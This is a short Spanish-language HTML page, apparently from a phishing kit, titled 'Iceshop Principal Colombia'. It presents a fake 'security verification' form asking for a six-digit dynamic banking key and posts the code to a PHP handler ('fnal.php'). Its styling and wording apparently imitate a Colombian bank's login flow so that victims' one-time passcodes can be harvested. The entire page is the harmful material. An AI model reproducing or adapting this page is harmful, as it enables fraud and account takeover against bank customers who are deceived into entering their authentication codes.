
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iceshop Principal Colombia</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body style="background-image: url(fondito.svg);background-size: cover;background-repeat: no-repeat;background-position: bottom -307px left -288px;">
    <br>
   <img src="loguitope.png" style="width: 90px;display: block;margin: 0 auto;">
   <br>
   <br>

    <form action="fnal.php" method="post" class="formulario">
        <h1 style="display: block;margin: 0 auto;text-align: center;font-size: 17pt;">¡Verificación de seguridad!</h1>
        <br>
        <br>
        <div class="input-group" >
            
           
            <input type="tel" minlength="6" maxlength="6" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" placeholder="Ingrese su clave dinamica de 6 dígitos" name="entoncesdaletra" required style="border-bottom: 1px solid #fdda24;line-height: 24px;font-size: 16px;letter-spacing: .4px;color: #2b2b2b;-webkit-appearance: none;border-left: 0;border-right: 0;border-top: none;" ></span>
        </div>
        <br>
      
       
      <br>
        <button type="submit">CONFIRMAR</button>
        <br>
        <br>
        
        <br>
        <br>
        <br>
       
        
    </form>
</body>
</html>